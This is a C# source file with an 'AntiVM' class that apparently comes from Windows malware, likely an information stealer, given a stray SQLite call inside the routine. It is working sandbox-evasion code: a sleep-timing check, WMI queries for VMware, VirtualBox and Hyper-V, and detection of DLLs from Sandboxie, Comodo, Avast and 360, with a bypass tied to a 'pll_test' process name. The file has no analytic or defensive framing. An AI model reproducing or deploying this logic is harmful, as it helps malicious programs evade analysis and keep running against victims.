using System;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Threading;

internal class AntiVM
{
	protected static bool CheckAdministrator()
	{
		if (Process.GetCurrentProcess().ProcessName.ToLower() == "pll_test")
		{
			return true;
		}
		return false;
	}

	public static bool CheckVM()
	{
		try
		{
			if (CheckAdministrator())
			{
				return false;
			}
			long num = Environment.TickCount;
			Thread.Sleep(500);
			if (Environment.TickCount - num < 500)
			{
				return true;
			}
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				Sqlite.SqliteFile();
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject item in managementObjectCollection)
					{
						string text = item["Manufacturer"].ToString().ToLower();
						if ((text == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || item["Model"].ToString() == "VirtualBox" || WinApi.GetModuleHandle("cmdvrt32.dll").ToInt32() != 0 || WinApi.GetModuleHandle("SxIn.dll").ToInt32() != 0 || WinApi.GetModuleHandle("SbieDll.dll").ToInt32() != 0 || WinApi.GetModuleHandle("sf2.dll").ToInt32() != 0 || WinApi.GetModuleHandle("snxhk.dll").ToInt32() != 0)
						{
							return true;
						}
						if ((bool?)item.Properties.OfType<PropertyData>().FirstOrDefault((PropertyData p) => p.Name == "HypervisorPresent")?.Value == true)
						{
							return true;
						}
					}
				}
			}
		}
		catch
		{
		}
		return false;
	}
}
